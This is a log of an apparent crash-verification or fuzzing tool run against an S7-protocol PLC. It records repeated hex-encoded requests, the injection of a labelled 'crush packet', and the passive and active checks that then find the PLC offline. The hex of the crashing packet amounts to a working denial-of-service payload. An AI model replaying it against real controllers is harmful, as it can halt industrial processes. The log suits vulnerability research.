[2021-12-19 20:37:48,099] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:37:48,100] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:37:51,257] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-12-19 20:37:51,258] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-12-19 20:37:51,259] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 68
[2021-12-19 20:37:51,260] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-12-19 20:37:51,475] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-12-19 20:37:51,678] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000400000800080001120411440100ff090004001c0000
[2021-12-19 20:37:51,884] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-12-19 20:37:52,089] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-12-19 20:37:52,296] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000700000800080001120411440100ff090004001c0000
[2021-12-19 20:37:52,499] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000800000800080001120411440100ff090004001c0000
[2021-12-19 20:37:52,706] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000900000800080001120411440100ff090004001c0000
[2021-12-19 20:37:52,910] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000a00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:53,115] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000b00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:53,324] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000c00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:53,528] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000d00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:53,732] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000e00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:53,937] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000f00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:54,144] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001000000800080001120411440100ff090004001c0000
[2021-12-19 20:37:54,349] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001100000800080001120411440100ff090004001c0000
[2021-12-19 20:37:54,551] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001200000800080001120411440100ff090004001c0000
[2021-12-19 20:37:54,756] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001300000800080001120411440100ff090004001c0000
[2021-12-19 20:37:54,962] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001400000800080001120411440100ff090004001c0000
[2021-12-19 20:37:55,169] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001500000800080001120411440100ff090004001c0000
[2021-12-19 20:37:55,375] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001600000800080001120411440100ff090004001c0000
[2021-12-19 20:37:55,580] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001700000800080001120411440100ff090004001c0000
[2021-12-19 20:37:55,785] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001800000800080001120411440100ff090004001c0000
[2021-12-19 20:37:55,991] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001900000800080001120411440100ff090004001c0000
[2021-12-19 20:37:56,196] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001a00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:56,414] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001b00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:56,621] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001c00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:56,827] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001d00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:57,030] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001e00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:57,233] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001f00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:57,439] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002000000800080001120411440100ff090004001c0000
[2021-12-19 20:37:57,642] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002100000800080001120411440100ff090004001c0000
[2021-12-19 20:37:57,848] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002200000800080001120411440100ff090004001c0000
[2021-12-19 20:37:58,051] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002300000800080001120411440100ff090004001c0000
[2021-12-19 20:37:58,259] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002400000800080001120411440100ff090004001c0000
[2021-12-19 20:37:58,464] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002500000800080001120411440100ff090004001c0000
[2021-12-19 20:37:58,670] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002600000800080001120411440100ff090004001c0000
[2021-12-19 20:37:58,875] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002700000800080001120411440100ff090004001c0000
[2021-12-19 20:37:59,077] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002800000800080001120411440100ff090004001c0000
[2021-12-19 20:37:59,280] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002900000800080001120411440100ff090004001c0000
[2021-12-19 20:37:59,481] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002a00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:59,686] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002b00000800080001120411440100ff090004001c0000
[2021-12-19 20:37:59,893] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002c00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:00,096] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002d00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:00,301] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002e00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:00,509] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002f00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:00,726] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003000000800080001120411440100ff090004001c0000
[2021-12-19 20:38:00,930] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003100000800080001120411440100ff090004001c0000
[2021-12-19 20:38:01,136] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003200000800080001120411440100ff090004001c0000
[2021-12-19 20:38:01,341] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003300000800080001120411440100ff090004001c0000
[2021-12-19 20:38:01,547] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003400000800080001120411440100ff090004001c0000
[2021-12-19 20:38:01,750] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003500000800080001120411440100ff090004001c0000
[2021-12-19 20:38:01,956] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003600000800080001120411440100ff090004001c0000
[2021-12-19 20:38:02,160] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003700000800080001120411440100ff090004001c0000
[2021-12-19 20:38:02,366] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003800000800080001120411440100ff090004001c0000
[2021-12-19 20:38:02,573] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003900000800080001120411440100ff090004001c0000
[2021-12-19 20:38:02,790] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003a00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:02,993] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003b00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:03,195] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003c00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:03,402] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003d00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:03,605] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003e00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:03,813] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003f00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:04,020] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004000000800080001120411440100ff090004001c0000
[2021-12-19 20:38:04,224] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004100000800080001120411440100ff090004001c0000
[2021-12-19 20:38:04,429] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004200000800080001120411440100ff090004001c0000
[2021-12-19 20:38:04,637] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004300000800080001120411440100ff090004001c0000
[2021-12-19 20:38:04,842] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004400000800080001120411440100ff090004001c0000
[2021-12-19 20:38:05,049] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004500000800080001120411440100ff090004001c0000
[2021-12-19 20:38:05,589] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:38:05,590] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100004600000e00000401120a10010003000083000001
[2021-12-19 20:38:05,792] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004700000800080001120411440100ff090004001c0000
[2021-12-19 20:38:05,995] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004800000800080001120411440100ff090004001c0000
[2021-12-19 20:38:06,202] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004900000800080001120411440100ff090004001c0000
[2021-12-19 20:38:06,407] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004a00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:06,614] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004b00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:06,816] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004c00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:07,018] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004d00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:07,223] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004e00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:07,429] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004f00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:07,634] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005000000800080001120411440100ff090004001c0000
[2021-12-19 20:38:07,839] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005100000800080001120411440100ff090004001c0000
[2021-12-19 20:38:08,045] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005200000800080001120411440100ff090004001c0000
[2021-12-19 20:38:08,251] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005300000800080001120411440100ff090004001c0000
[2021-12-19 20:38:08,456] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005400000800080001120411440100ff090004001c0000
[2021-12-19 20:38:08,663] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005500000800080001120411440100ff090004001c0000
[2021-12-19 20:38:08,869] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005600000800080001120411440100ff090004001c0000
[2021-12-19 20:38:09,071] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005700000800080001120411440100ff090004001c0000
[2021-12-19 20:38:09,277] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005800000800080001120411440100ff090004001c0000
[2021-12-19 20:38:09,480] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005900000800080001120411440100ff090004001c0000
[2021-12-19 20:38:09,697] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005a00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:09,905] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005b00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:10,109] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005c00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:10,315] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005d00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:10,522] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005e00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:10,730] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005f00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:10,933] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006000000800080001120411440100ff090004001c0000
[2021-12-19 20:38:11,139] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006100000800080001120411440100ff090004001c0000
[2021-12-19 20:38:11,345] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006200000800080001120411440100ff090004001c0000
[2021-12-19 20:38:11,549] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006300000800080001120411440100ff090004001c0000
[2021-12-19 20:38:11,755] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006400000800080001120411440100ff090004001c0000
[2021-12-19 20:38:11,961] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006500000800080001120411440100ff090004001c0000
[2021-12-19 20:38:12,168] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006600000800080001120411440100ff090004001c0000
[2021-12-19 20:38:12,374] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006700000800080001120411440100ff090004001c0000
[2021-12-19 20:38:12,579] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006800000800080001120411440100ff090004001c0000
[2021-12-19 20:38:12,787] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006900000800080001120411440100ff090004001c0000
[2021-12-19 20:38:12,991] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006a00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:13,198] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006b00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:13,399] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006c00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:13,604] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006d00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:13,715] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:38:13,808] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:38:25,850] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:38:25,852] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 108 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:38:34,129] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:38:34,158] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f080320100006e0000080000f000000a000a00f0
[2021-12-19 20:38:34,158] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300006e00000800000000f0000003000300f0
[2021-12-19 20:38:38,162] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:38:38,163] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 59
[2021-12-19 20:38:38,169] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006f00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:38,382] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007000000800080001120411440100ff090004001c0000
[2021-12-19 20:38:38,585] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007100000800080001120411440100ff090004001c0000
[2021-12-19 20:38:38,790] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007200000800080001120411440100ff090004001c0000
[2021-12-19 20:38:39,010] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007300000800080001120411440100ff090004001c0000
[2021-12-19 20:38:39,227] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007400000800080001120411440100ff090004001c0000
[2021-12-19 20:38:39,430] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007500000800080001120411440100ff090004001c0000
[2021-12-19 20:38:39,634] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007600000800080001120411440100ff090004001c0000
[2021-12-19 20:38:39,837] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007700000800080001120411440100ff090004001c0000
[2021-12-19 20:38:40,042] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007800000800080001120411440100ff090004001c0000
[2021-12-19 20:38:40,257] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007900000800080001120411440100ff090004001c0000
[2021-12-19 20:38:40,461] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007a00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:40,665] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007b00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:40,872] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007c00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:41,080] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007d00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:41,281] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007e00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:41,492] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007f00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:41,706] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008000000800080001120411440100ff090004001c0000
[2021-12-19 20:38:41,911] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008100000800080001120411440100ff090004001c0000
[2021-12-19 20:38:42,115] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008200000800080001120411440100ff090004001c0000
[2021-12-19 20:38:42,322] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008300000800080001120411440100ff090004001c0000
[2021-12-19 20:38:42,529] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008400000800080001120411440100ff090004001c0000
[2021-12-19 20:38:42,735] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008500000800080001120411440100ff090004001c0000
[2021-12-19 20:38:42,939] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008600000800080001120411440100ff090004001c0000
[2021-12-19 20:38:43,141] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008700000800080001120411440100ff090004001c0000
[2021-12-19 20:38:43,344] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008800000800080001120411440100ff090004001c0000
[2021-12-19 20:38:43,560] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008900000800080001120411440100ff090004001c0000
[2021-12-19 20:38:43,777] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008a00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:43,983] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008b00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:44,188] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008c00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:44,391] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008d00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:44,607] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008e00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:44,811] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008f00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:45,044] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009000000800080001120411440100ff090004001c0000
[2021-12-19 20:38:45,261] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009100000800080001120411440100ff090004001c0000
[2021-12-19 20:38:45,465] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009200000800080001120411440100ff090004001c0000
[2021-12-19 20:38:45,670] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009300000800080001120411440100ff090004001c0000
[2021-12-19 20:38:45,872] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009400000800080001120411440100ff090004001c0000
[2021-12-19 20:38:46,089] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009500000800080001120411440100ff090004001c0000
[2021-12-19 20:38:46,292] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009600000800080001120411440100ff090004001c0000
[2021-12-19 20:38:46,495] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009700000800080001120411440100ff090004001c0000
[2021-12-19 20:38:46,701] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009800000800080001120411440100ff090004001c0000
[2021-12-19 20:38:46,903] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009900000800080001120411440100ff090004001c0000
[2021-12-19 20:38:47,109] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009a00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:47,312] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009b00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:47,514] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009c00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:47,718] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009d00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:47,924] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009e00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:48,128] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009f00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:48,331] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a000000800080001120411440100ff090004001c0000
[2021-12-19 20:38:48,534] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a100000800080001120411440100ff090004001c0000
[2021-12-19 20:38:48,742] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a200000800080001120411440100ff090004001c0000
[2021-12-19 20:38:48,944] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a300000800080001120411440100ff090004001c0000
[2021-12-19 20:38:49,149] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a400000800080001120411440100ff090004001c0000
[2021-12-19 20:38:49,353] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a500000800080001120411440100ff090004001c0000
[2021-12-19 20:38:49,557] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a600000800080001120411440100ff090004001c0000
[2021-12-19 20:38:49,761] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a700000800080001120411440100ff090004001c0000
[2021-12-19 20:38:49,966] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a800000800080001120411440100ff090004001c0000
[2021-12-19 20:38:50,168] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a900000800080001120411440100ff090004001c0000
[2021-12-19 20:38:50,693] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:38:50,694] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f08032010000aa00000e00000401120a10010003000083000001
[2021-12-19 20:38:50,911] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ab00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:51,117] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ac00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:51,321] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ad00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:51,525] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ae00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:51,728] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000af00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:51,932] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b000000800080001120411440100ff090004001c0000
[2021-12-19 20:38:52,136] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b100000800080001120411440100ff090004001c0000
[2021-12-19 20:38:52,343] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b200000800080001120411440100ff090004001c0000
[2021-12-19 20:38:52,549] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b300000800080001120411440100ff090004001c0000
[2021-12-19 20:38:52,754] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b400000800080001120411440100ff090004001c0000
[2021-12-19 20:38:52,957] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b500000800080001120411440100ff090004001c0000
[2021-12-19 20:38:53,164] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b600000800080001120411440100ff090004001c0000
[2021-12-19 20:38:53,366] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b700000800080001120411440100ff090004001c0000
[2021-12-19 20:38:53,573] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b800000800080001120411440100ff090004001c0000
[2021-12-19 20:38:53,778] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b900000800080001120411440100ff090004001c0000
[2021-12-19 20:38:53,982] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ba00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:54,189] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bb00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:54,396] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bc00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:54,602] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bd00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:54,808] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000be00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:55,013] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bf00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:55,217] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c000000800080001120411440100ff090004001c0000
[2021-12-19 20:38:55,423] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c100000800080001120411440100ff090004001c0000
[2021-12-19 20:38:55,627] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c200000800080001120411440100ff090004001c0000
[2021-12-19 20:38:55,831] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c300000800080001120411440100ff090004001c0000
[2021-12-19 20:38:56,034] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c400000800080001120411440100ff090004001c0000
[2021-12-19 20:38:56,238] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c500000800080001120411440100ff090004001c0000
[2021-12-19 20:38:56,446] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c600000800080001120411440100ff090004001c0000
[2021-12-19 20:38:56,653] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c700000800080001120411440100ff090004001c0000
[2021-12-19 20:38:56,870] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c800000800080001120411440100ff090004001c0000
[2021-12-19 20:38:57,072] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c900000800080001120411440100ff090004001c0000
[2021-12-19 20:38:57,274] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ca00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:57,477] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cb00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:57,684] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cc00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:57,886] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cd00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:58,090] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ce00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:58,295] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cf00000800080001120411440100ff090004001c0000
[2021-12-19 20:38:58,500] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d000000800080001120411440100ff090004001c0000
